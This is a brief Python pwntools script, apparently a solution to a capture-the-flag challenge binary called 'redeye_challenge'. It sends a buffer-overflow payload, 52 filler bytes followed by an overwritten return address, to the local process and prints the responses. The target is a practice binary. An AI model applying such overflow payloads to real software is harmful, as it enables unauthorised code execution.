from pwn import *
import sys
# Idea is to spam until the os finds the right spot !
pr = process('./redeye_challenge')
pr.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb2\x91\x04\x08".encode('latin-1'))
print(pr.recvline())
print(pr.recvline())
print(pr.recvline())
print(pr.recvline())

#sys.stdout.buffer.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb2\x91\x04\x08");


